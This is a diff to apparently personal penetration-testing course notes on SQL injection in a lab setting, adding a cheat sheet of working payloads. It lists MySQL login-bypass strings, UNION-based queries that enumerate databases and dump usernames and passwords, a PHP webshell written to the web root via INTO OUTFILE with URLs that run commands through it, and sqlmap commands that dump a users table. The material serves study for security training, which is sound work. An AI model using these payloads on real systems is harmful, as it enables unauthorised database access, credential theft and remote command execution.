@@ -860,11 +860,44 @@
     ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
     ' UNION SELECT null, username, password, description, null FROM users -- //
     ```
-  - time-based
-    `' AND IF (1=1, sleep(3),'false') -- //`
-  - boolean-based
-    `' AND 1=1 -- //`
-- 10.3.2. Automating the Attack
+  - time-based  
+    `' AND IF (1=1, sleep(3),'false') -- //`  
+  - boolean-based  
+    `' AND 1=1 -- //`  
+- 10.3.2. Automating the Attack  
+  - ERROR-based mysql login bypass  
+    `' OR 1=1 # `  
+    `' or 1=1 in (select @@version) #`  
+    `' OR 1=1 in (SELECT password FROM users) #`  
+    https://10015.io/tools/md5-encrypt-decrypt    
+  - UNION-based  mysql  
+    identify number of columns: 5  
+    `' ORDER BY 1 #`   > until error hit : E.g 6 hit, then columns are 5  
+    current database name, version, user: offsec  
+    `' UNION SELECT 'a', database(), @@version, user(), 'e' # `  
+    List all databases: mysql  
+    `' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata #`  
+    List current db tables and columns: customers, users  
+    `' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() #`  
+    Dump data from a specific table  
+    `' UNION SELECT null, username, password, null, null FROM users #`  
+    Upload webshell  
+    `' UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" #`  
+    Execute webshell  
+    `http://192.168.173.19/tmp/webshell.php?cmd=find%20/%20-name%20%22flag.txt%22%202%3E/dev/null`  
+    `http://192.168.173.19/tmp/webshell.php?cmd=cat%20flag.txt`  
+  - sqlmap time based  
+    Find SQL injection points: time-based blind  
+    `sqlmap -u http://192.168.173.19/blindsqli.php?user=admin -p user`  
+    Dump data from table (slow) - one click  
+    `sqlmap -u http://192.168.173.19/blindsqli.php?user=admin -p user --dump`  
+    List database  
+    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user --dbs --batch --threads=5`  
+    List tables  
+    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec --tables --batch --threads=5`  
+    Dump data for the table  
+    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec -T users --dump --batch --threads=5`  
+  - 
 
 ### Client-site attacks  
 - 12.1.1 Information Gathering
